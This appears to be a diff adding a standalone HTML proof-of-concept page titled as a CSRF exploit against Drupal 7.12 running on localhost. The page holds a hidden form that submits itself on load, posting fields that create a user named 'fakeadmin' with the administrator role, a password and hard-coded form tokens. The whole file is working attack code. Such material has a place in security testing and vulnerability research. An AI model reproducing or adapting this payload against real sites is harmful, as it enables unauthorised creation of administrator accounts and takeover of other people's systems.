@@ -1,0 +1,18 @@
+<html>
+<H2>CSRF Exploit change user to admin</H2>
+<form method="POST" name="form0" action="http://localhost:8025/drupal/7.12/?q=user#overlay=%3Fq%3Dadmin%252Fpeople%252Fcreate">
+<input type="hidden" name="name" value="fakeadmin"/>
+<input type="hidden" name="mail" value="fakeadmin@new_admin.com"/>
+<input type="hidden" name="pass[pass1]" value="fakepassword"/>
+<input type="hidden" name="pass[pass2]" value="fakepassword"/>
+<input type="hidden" name="status" value="1"/>
+<input type="hidden" name="roles[3]" value="3"/>
+<input type="hidden" name="timezone" value="Asia/Singapore"/>
+<input type="hidden" name="form_build_id" value="form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY"/>
+<input type="hidden" name="form_token" value="cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc"/>
+<input type="hidden" name="form_id" value="user_register_form"/>
+<input type="hidden" name="op" value="Create new account"/>
+</form>
+<body onload="javascript:document.forms[0].submit()">
+</body>
+</html>
